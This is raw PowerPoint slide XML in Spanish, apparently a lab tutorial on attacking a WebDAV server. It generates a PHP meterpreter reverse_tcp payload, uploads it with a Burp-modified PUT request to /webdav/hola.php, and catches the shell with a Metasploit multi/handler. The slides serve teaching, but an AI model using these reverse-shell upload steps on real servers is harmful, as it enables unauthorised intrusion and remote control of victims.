                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -p </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php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/</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meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/</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reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </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lhost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="00FF00"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>10.0.3.8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </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lport</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>=4444 -f raw</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BFD2F387-27CA-9A00-31C6-86B26CE884AC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2521138" y="3290330"/>
            <a:ext cx="7592485" cy="2953162"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30772374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a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Inyectar el código PHP malicioso</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2ED1C577-E436-0136-B8F7-B53004D24061}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="289516" y="887980"/>
            <a:ext cx="9245337" cy="2308324"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Desde atacante nos conectamos a la víctima por web usando el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>burpsuite</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>10.0.3.12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>/webdav/</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Interceptamos el tráfico y lo enviamos al </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>repeater</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E9993749-7280-735D-1E3F-F6B5CB9D3401}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7652244" y="624204"/>
            <a:ext cx="3535039" cy="2804796"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{231F5238-5697-D024-1D56-74F401218D35}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4025224" y="3421410"/>
            <a:ext cx="4141551" cy="3331247"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="313672642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a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Inyectar el código PHP malicioso</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2ED1C577-E436-0136-B8F7-B53004D24061}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="519697" y="955977"/>
            <a:ext cx="6094428" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Si al enviar el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>send</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> no lo modifico recibo una respuesta 200</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EB9C8D1C-63CF-A1A5-43A5-44C6F72E0822}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2680811" y="1504398"/>
            <a:ext cx="6830378" cy="3000794"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42394638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a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Inyectar el código PHP malicioso</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2ED1C577-E436-0136-B8F7-B53004D24061}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="709368" y="887980"/>
            <a:ext cx="5097543" cy="4524315"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>El contenido de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>repeater</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> lo tengo que modificar</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>PUT /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>webdav</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hola.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP/1.1</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>	Content-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>Length</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>: 1109</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Y añadir el código PHP generado con anterioridad con un salto de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>linea</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>El valor del Content-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>Length</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> se ha de calcular con el salto de línea incluido</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Al enviarlo con el “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>send</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>” nos responde un 201</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Y comprobamos que en la víctima se ha creado</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6D2A55C0-D955-4B3A-837C-00D2E3A21503}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="344275"/>
            <a:ext cx="4725059" cy="4925112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Imagen 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C1E3D3D5-42FF-1CF3-F48D-84B46C933402}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2432300" y="3750302"/>
            <a:ext cx="2972215" cy="1143160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Imagen 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{90268B76-67A3-E560-FE2B-81F22F7C1B14}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2055043" y="5417934"/>
            <a:ext cx="6234226" cy="1204639"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40201297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a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ataque con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>metasploid</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2ED1C577-E436-0136-B8F7-B53004D24061}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="646086" y="887980"/>
            <a:ext cx="6094428" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Desde el atacante</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>	 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>/multi/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>handler</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>show </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>options</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Imagen 1" descr="Gráfico&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12D33FA3-8C8D-AE3C-1CAF-7F70A018FE23}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7025661" y="496661"/>
            <a:ext cx="4278630" cy="3382010"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Imagen 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DBA7CA00-15B4-946C-0876-D73C7FA9DF62}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1385741" y="2088309"/>
            <a:ext cx="5984795" cy="4520502"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="293213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a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ataque con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>metasploid</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2ED1C577-E436-0136-B8F7-B53004D24061}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="519697" y="887980"/>
            <a:ext cx="6094428" cy="2862322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>set payload </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php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/</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meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>set LHOST </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>10.0.3.12</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Lanzamos el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>exploit</a:t>
            </a:r>
